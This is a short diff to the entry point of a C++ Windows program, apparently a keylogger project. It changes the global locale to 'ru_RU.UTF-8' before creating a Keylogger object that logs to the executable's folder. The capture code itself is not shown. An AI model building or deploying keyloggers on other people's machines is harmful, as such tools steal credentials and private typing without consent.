@@ -9,7 +9,7 @@ std::wstring GetCurrentDirectory(std::wstring executable) {
 }
 
 int wmain(int argc, wchar_t* argv[]) {
-	std::locale::global(std::locale(""));
+	std::locale::global(std::locale("ru_RU.UTF-8"));
 
 	Keylogger keylogger(new Logger(GetCurrentDirectory(argv[0]),L"",10));
 
